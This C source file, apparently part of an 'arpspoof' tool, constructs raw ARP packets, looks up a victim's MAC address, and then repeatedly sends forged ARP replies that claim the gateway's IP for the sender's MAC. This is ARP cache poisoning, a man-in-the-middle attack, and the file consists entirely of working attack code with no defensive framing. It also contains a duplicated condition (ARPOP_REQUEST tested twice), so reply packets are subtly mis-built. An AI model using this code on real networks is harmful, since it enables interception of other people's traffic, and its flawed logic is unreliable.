#include "arpspoof.h"

uint8_t* construct_arp_pac(int sock_r, struct sockaddr_ll socket_address, unsigned int addr_len, uint8_t* sha, uint8_t* tha, uint8_t* spa, uint8_t* tpa, unsigned int op){
    struct ether_header *eth_hdr = (struct ether_header*) malloc(sizeof(struct ether_header));
    memset(eth_hdr, 0, sizeof(struct ether_header));
    int i;
    for(i = 0;i<ETH_ALEN;i++)
    {
        eth_hdr->ether_shost[i] = *(sha+i);
        eth_hdr->ether_dhost[i] = *(tha+i);
    }
    eth_hdr->ether_type = htons(ETHERTYPE_ARP);

    struct ether_arp *arp_hdr = (struct ether_arp*) malloc(sizeof(struct ether_arp));
    memset(arp_hdr, 0, sizeof(struct ether_arp));

    arp_hdr->ea_hdr.ar_hrd = htons(0x0001); //ethernet
    arp_hdr->ea_hdr.ar_pro = htons(0x0800); //ipv4
    arp_hdr->ea_hdr.ar_hln = 0x06; //6 bytes
    arp_hdr->ea_hdr.ar_pln = 0x04; //4 bytes
    arp_hdr->ea_hdr.ar_op = htons(op);  
    for(i = 0;i<ETH_ALEN;i++)
    {
        arp_hdr->arp_sha[i] = *(sha+i);
        if(op == ARPOP_REQUEST)
            arp_hdr->arp_tha[i] = 0x00;
        else if(op == ARPOP_REQUEST)
            arp_hdr->arp_tha[i] = *(tha+i);  
    }
    for(i = 0; i< 4; i++){
        arp_hdr->arp_spa[i] = *(spa+i);
        arp_hdr->arp_tpa[i] = *(tpa+i);
    }

    uint8_t* arp_pac = malloc(ARP_PACKET_LEN);
    memset(arp_pac, 0 , ARP_PACKET_LEN);
    memcpy(arp_pac, eth_hdr, sizeof(struct ether_header));
    memcpy(arp_pac + sizeof(struct ether_header), arp_hdr, sizeof(struct ether_arp));
    free(eth_hdr);
    free(arp_hdr);
    return arp_pac;
}
uint8_t* get_target_mac(int sock_r, struct sockaddr_ll socket_address, unsigned int addr_len, uint8_t* my_mac, uint8_t* my_ip, uint8_t* target_ip){

    uint8_t* broadcast_mac = calloc(6, sizeof(uint8_t));
    memset(broadcast_mac, 0xff, 6*sizeof(uint8_t));
    uint8_t* arp_req = construct_arp_pac(sock_r, socket_address, addr_len, my_mac, broadcast_mac, my_ip, target_ip, ARPOP_REQUEST);
    /*
    for(i =0; i<len;i++)
        printf("%.2x ", *(arp_pac+i));
    printf("\nSize = %d\n", len);
    */
    uint8_t *arp_rep = malloc(ARP_PACKET_LEN);
    memset(arp_rep, 0 , ARP_PACKET_LEN);
    do
    {
        if(!sendto(sock_r, arp_req, ARP_PACKET_LEN, 0, (struct sockaddr*) &socket_address, addr_len))
            fprintf(stderr,"error in sending\n");
        else
        {
            fprintf(stderr,"sent arp request\n");
        }
        sleep(1);
    } while( recvfrom(sock_r, arp_rep, ARP_PACKET_LEN, 0, (struct sockaddr*) &socket_address, &addr_len) <= 0);
    
    /*
    for(i =0; i<len;i++)
        printf("%.2x ", *(arp_rep+i));
    printf("\n");
    */
    uint8_t* target_mac = calloc(ETH_ALEN, sizeof(uint8_t));
    int i;
    for(i=0;i<ETH_ALEN;i++)
        *(target_mac+i) = *(arp_rep+i+ETH_ALEN);

    free(arp_req);
    free(arp_rep);
    free(broadcast_mac);
    return target_mac;
}
int send_arp_reply_fmac(int sock_r, struct sockaddr_ll socket_address, unsigned int addr_len, uint8_t* my_mac, uint8_t* target_mac, uint8_t* gateway_ip, uint8_t* target_ip){
    uint8_t* arp_rep = construct_arp_pac(sock_r, socket_address, addr_len, my_mac, target_mac, gateway_ip, target_ip, ARPOP_REPLY);
    /*
    for(i =0; i<len;i++)
        printf("%.2x ", *(arp_pac+i));
    printf("\nSize = %d\n", len);
    */
   int count = 0;
    do
    {
        if(!sendto(sock_r, arp_rep, ARP_PACKET_LEN, 0, (struct sockaddr*) &socket_address, addr_len))
            fprintf(stderr,"error in sending\n");
        else
        {
            count++;
            fprintf(stderr,"send arp reply %d time\n", count);
        }
        sleep(1);
    } while(count <= 100 );
    free(arp_rep);
    return 1;
}